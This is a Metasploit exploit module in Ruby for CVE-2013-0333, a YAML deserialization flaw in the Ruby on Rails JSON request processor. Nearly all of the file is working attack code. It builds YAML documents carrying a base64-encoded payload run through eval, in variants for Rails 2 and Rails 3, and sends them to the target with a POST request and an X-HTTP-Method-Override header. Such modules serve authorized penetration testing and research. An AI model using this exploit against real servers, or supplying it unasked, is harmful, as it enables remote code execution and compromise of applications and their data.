##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::CmdStagerTFTP
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Ruby on Rails JSON Processor YAML Deserialization Code Execution',
            'Description'    => %q{
                    This module exploits a remote code execution vulnerability in the
                JSON request processor of the Ruby on Rails application framework.
                This vulnerability allows an attacker to instantiate a remote object,
                which in turn can be used to execute any ruby code remotely in the
                context of the application. This vulnerability is very similar to
                CVE-2013-0156.
 
                This module has been tested successfully on RoR 3.0.9, 3.0.19, and
                2.3.15.
 
                The technique used by this module requires the target to be running a
                fairly recent version of Ruby 1.9 (since 2011 or so). Applications
                using Ruby 1.8 may still be exploitable using the init_with() method,
                but this has not been demonstrated.
 
            },
            'Author'         =>
                [
                    'jjarmoc',  # Initial module based on cve-2013-0156, testing help
                    'egypt',    # Module
                    'lian',     # Identified the RouteSet::NamedRouteCollection vector
                ],
            'License'        => MSF_LICENSE,
            'References'  =>
                [
                    ['CVE', '2013-0333'],
                ],
            'Platform'       => 'ruby',
            'Arch'           => ARCH_RUBY,
            'Privileged'     => false,
            'Targets'        =>  [ ['Automatic', {} ] ],
            'DisclosureDate' => 'Jan 28 2013',
            'DefaultOptions' => { "PrependFork" => true },
            'DefaultTarget' => 0))
 
        register_options(
            [
                Opt::RPORT(80),
                OptString.new('TARGETURI', [ true, 'The path to a vulnerable Ruby on Rails application', "/"]),
                OptString.new('HTTP_METHOD', [ true, 'The HTTP request method (GET, POST, PUT typically work)', "POST"])
 
            ], self.class)
 
    end
 
    #
    # Create the YAML document that will be embedded into the JSON
    #
    def build_yaml_rails2
 
        code = Rex::Text.encode_base64(payload.encoded)
        yaml =
            "--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\n" +
            "'#{Rex::Text.rand_text_alpha(rand(8)+1)}; " +
            "eval(%[#{code}].unpack(%[m0])[0]);' " +
            ": !ruby/object:ActionController::Routing::Route\n segments: []\n requirements:\n   " +
            ":#{Rex::Text.rand_text_alpha(rand(8)+1)}:\n     :#{Rex::Text.rand_text_alpha(rand(8)+1)}: " +
            ":#{Rex::Text.rand_text_alpha(rand(8)+1)}\n"
        yaml.gsub(':', '\u003a')
    end
 
 
    #
    # Create the YAML document that will be embedded into the JSON
    #
    def build_yaml_rails3
 
        code = Rex::Text.encode_base64(payload.encoded)
        yaml =
            "--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection\n" +
            "'#{Rex::Text.rand_text_alpha(rand(8)+1)};eval(%[#{code}].unpack(%[m0])[0]);' " +
            ": !ruby/object:OpenStruct\n table:\n  :defaults: {}\n"
        yaml.gsub(':', '\u003a')
    end
 
    def build_request(v)
        case v
        when 2; build_yaml_rails2
        when 3; build_yaml_rails3
        end
    end
 
    #
    # Send the actual request
    #
    def exploit
 
        [2, 3].each do |ver|
            print_status("Sending Railsv#{ver} request to #{rhost}:#{rport}...")
            send_request_cgi({
                'uri'     => normalize_uri(target_uri.path),
                'method'  => datastore['HTTP_METHOD'],
                'ctype'   => 'application/json',
                'headers' => { 'X-HTTP-Method-Override' => 'get' },
                'data'    => build_request(ver)
            }, 25)
            handler
        end
 
    end
end
